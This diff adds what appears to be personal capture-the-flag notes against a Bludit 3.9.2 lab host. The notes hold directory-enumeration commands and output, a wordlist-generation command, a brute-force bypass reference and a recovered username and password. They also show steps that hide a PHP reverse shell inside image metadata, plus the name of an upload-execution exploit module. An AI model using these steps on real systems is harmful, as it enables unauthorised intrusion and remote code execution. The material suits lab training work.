@@ -1,0 +1,32 @@
+sudo gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirb/common.txt -x php,txt
+/0 (Status: 200)
+/about (Status: 200)
+/admin (Status: 301)
+/cgi-bin/ (Status: 301)
+/install.php (Status: 200)
+/LICENSE (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+
+sudo python3 dirsearch.py -u http://10.10.10.191 -e php,txt
+[19:04:01] 200 -   30B  - /install.php - bludit
+
+gobuster dir -u http://10.10.10.191 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt --timeout 30s
+/todo.txt (Status: 200)
+/usb (Status: 200)
+
+found a possible user in todo.txt -> fergus
+bludit version 3.9.2
+for possible passwords -> cewl http://10.10.10.191/ -m 6 -w words.txt
+
+found a brute force PoC -> https://rastating.github.io/bludit-brute-force-mitigation-bypass/
+
+fergus:RolandDeschain
+
+
+TESTE=$(cat php-reverse-shell.php)
+convert cat.png cat.jpg
+exiftool -DocumentName="$TESTE" cat.jpg
+
+bludit_upload_images_exec
+
